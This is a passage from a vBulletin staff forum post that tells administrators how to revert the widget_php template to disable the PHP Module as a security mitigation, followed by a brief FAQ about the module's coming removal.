  1. Put the site into [debug mode](https://www.vbulletin.com/go/vb5debug).
  2. Log into the AdminCP.
  3. Go to Styles -> Style Manager.
  4. Open the template list for the MASTER style.
  5. Scroll to the bottom where it says Module Templates.
  6. Highlight the widget\_php module.
  7. Click the Revert Button.
  8. This will completely delete the template from your site and make the PHP Module inoperative.The next build of 5.6.3 will contain the patch.

  **Q: My PHP Modules no longer work. Is this to be expected?**

  A: Yes. This security patch disables the PHP Module. This module will be removed from the software completely in 5.6.4.

  **Q: How do I include custom PHP on my pages?**

  A: Please read this article: [https://forum.vbulletin.com/articles...php-in-modules](https://forum.vbulletin.com/articles/vbulletin-5-connect-aa/reference/4445230-including-custom-php-in-modules)

  Translations provided by Google.

  ---

  Wayne Luke

  [The Rabid Badger](http://forums.rabidbadger.io) - a vBulletin Cloud demonstration site.

  [vBulletin 5 API](http://vb5support.com/api)

  👍

  3

  ## Comment

  Post
  Cancel

Previous
template
Next

widgetinstance 262 (Related Topics) skipped due to lack of content & hide\_module\_if\_empty option.

(vbulletin-forum1.internetbrands.com)

* Default Style
  + Default Style
  + - vB5 Style
  + - Pink
  + - Black Red
  + - Blue Yellow
  + - Cool Blue
  + - Denim
  + - Gradient
  + - Grey Stripes
  + - Grunge
  + - Light Blue
  + - Old School
  + - Orange Purple
  + - Blue Green
  + - Red
  + - Stripes
  + - Wood
  + - Dark
  + - Winter
  + - vBulletin Default Theme
  + - Halloween
* English (US)
  + Deutsch (Du)
  + English (US)
  + French
  + Right-to-Left Test
  + Spanish

* [Help](https://forum.vbulletin.com/help)
* [Member's Area](http://members.vbulletin.com)
* [Manual](http://www.vbulletin.com/docs/html)
* [Submit Ticket](http://www.vbulletin.com/go/techsupport)
* [Privacy Policy](https://www.internetbrands.com/privacy/privacy-highlights.html?site=www.vbulletin.com)
* [Terms of Use](https://www.internetbrands.com/ibterms/)
* [Cookie Policy](https://www.internetbrands.com/privacy/cookie-policy)
* [Forum Rules](https://forum.vbulletin.com/terms-of-service)
* [Contact Us](https://forum.vbulletin.com/contact-us)
* Go to top

Manage Preferences

Your Privacy Choices![](https://icons.internetbrands.com/ccpa/privacyoptions29x14.png)

Powered by [vBulletin®](https://www.vbulletin.com) Version 6.0.8
Copyright © 2025 MH Sub I, LLC dba vBulletin. All rights reserved.
All times are GMT-8. This page was generated at 4:43am.

Working...

Yes
No

OK

OK
Cancel

😀

😂

🥰

😘

🤢

😎

😞

😡

👍

👎

☕


